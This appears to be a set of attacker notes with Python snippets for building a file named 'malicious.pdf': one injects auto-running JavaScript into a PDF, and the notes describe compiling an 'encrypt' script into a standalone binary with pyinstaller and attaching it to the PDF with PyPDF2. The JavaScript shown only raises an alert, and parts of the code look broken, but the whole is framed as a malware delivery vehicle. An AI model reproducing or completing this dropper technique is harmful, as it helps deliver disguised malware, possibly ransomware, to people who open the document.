```python
from fpdf import FPDF

class PDFWithJS(FPDF):
    def include_js(self, script):
        self._out(f"/Names [(EmbeddedJS) << /S /JavaScript /JS ({script}) >>]")

pdf = PDFWithJS()
pdf.add_page()
pdf.set_font("Arial", size=12)
pdf.cell(200, 10, txt="This is a test PDF with embedded JavaScript.")

js = """
app.alert('This triggered when the pdf was opened.');
"""
pdf.include_js(js)
pdf.output("malicious.pdf")
```

**Notes:**
use `pyinstaller`. turns our script into binary so that we can run this on
any machine even if python is not installed

- something like:
  - pip3 install pyinstaller
  - pyinstaller --onefile encrypt.py

**Embedding:**
embed the binary into the pdf like so:

```python
from PyPDF2 import PdfWriter

# Create a new PDF and attach the binary
writer = PdfWriter()
writer.add_attachment("encrypt", open("encrypt", "rb").read())
with open("malicious.pdf", "wb") as f:
    writer.write(f)
```
